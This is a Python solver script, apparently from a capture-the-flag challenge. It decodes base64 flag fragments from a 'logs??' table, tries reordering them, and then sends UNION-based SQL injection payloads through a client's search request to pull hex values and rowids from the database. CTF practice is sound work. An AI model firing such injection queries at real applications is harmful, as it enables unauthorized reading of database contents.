"""
Re-examine the logs?? data more carefully.
The fragments might need different ordering or concatenation.
Also try different interpretations.
"""
import base64
import itertools

# Raw data from logs?? table (ordered by id)
fragments = [
    (1, "ZGRkew=="),      # ddd{
    (2, "dGgxNQ=="),      # th15
    (3, "XyBpcw=="),      # _ is
    (4, "ZmxAZ2QzZm9ydX0="),  # fl@gd3foru}
    (5, "ISEh"),          # !!!
    (6, "aXMgdGFodCByZWxsYXk/"),  # is taht rellay?
]

decoded = []
for id_, b64 in fragments:
    d = base64.b64decode(b64).decode('utf-8')
    decoded.append((id_, b64, d))
    print(f"  id={id_}: {b64:25s} -> {d}")

print("\n--- All permutations that start with 'ddd{' or 'd3ctf{' ---")
# The flag format is d3ctf{...}
# But id=1 decodes to 'ddd{' not 'd3ctf{'
# Maybe the base64 is slightly modified?

# Let's check if any rearrangement of the base64 produces d3ctf
print("\n--- Checking if base64 concatenation produces d3ctf ---")
# Maybe all the base64 strings should be concatenated FIRST, then decoded
all_b64 = ''.join([b64 for _, b64 in fragments])
print(f"All b64 concatenated: {all_b64}")
try:
    decoded_all = base64.b64decode(all_b64).decode('utf-8', errors='replace')
    print(f"Decoded: {decoded_all}")
except Exception as e:
    print(f"Decode error: {e}")

# Try different orderings of base64 concatenation
print("\n--- Trying various orderings ---")
for perm in itertools.permutations(range(6)):
    b64_concat = ''.join([fragments[i][1] for i in perm])
    try:
        d = base64.b64decode(b64_concat + '=' * ((4 - len(b64_concat) % 4) % 4)).decode('utf-8', errors='replace')
        if 'd3ctf' in d.lower() or 'd3ctf' in d:
            print(f"  ORDER {perm}: {d}")
    except:
        pass

# Maybe the text fragments spell something when rearranged
print("\n--- Text rearrangements ---")
texts = [d for _, _, d in decoded]
for perm in itertools.permutations(range(6)):
    result = ''.join([texts[i] for i in perm])
    if 'd3ctf' in result.lower():
        print(f"  ORDER {perm}: {result}")

# Check: maybe 'ddd' is actually 'd3c' in some encoding
# Or maybe we need to look at raw bytes differently
print("\n--- Raw byte analysis ---")
for id_, b64, d in decoded:
    raw = base64.b64decode(b64)
    print(f"  id={id_}: hex={raw.hex()}, ascii={d}, bytes={list(raw)}")

# Maybe use the encrypted gateway to query with different column selections
print("\n--- Perhaps there are more columns or hidden data ---")
from client import GhostClient
c = GhostClient()
c.bootstrap()

# Check total rows and all columns
res = c.request("search", {"q": "' UNION SELECT id, hex(\"text???\"), length(\"text???\") FROM \"logs??\" ORDER BY id--"})
if res.get("ok"):
    rows = [r for r in res["data"]["rows"] if isinstance(r["summary"], (int, float)) or (isinstance(r["summary"], str) and r["summary"].isdigit())]
    for r in res["data"]["rows"]:
        try:
            int(r["summary"])
            hex_val = r["title"]
            id_val = r["id"]
            print(f"  id={id_val}: hex={hex_val}, len={r['summary']}")
        except:
            pass

# Try getting rowid or other hidden columns
res = c.request("search", {"q": "' UNION SELECT rowid, \"text???\", typeof(\"text???\") FROM \"logs??\"--"})
if res.get("ok"):
    print("\nrowid query results:")
    for r in res["data"]["rows"]:
        if r["summary"] == "text":
            print(f"  rowid={r['id']}: text={r['title']}, type={r['summary']}")
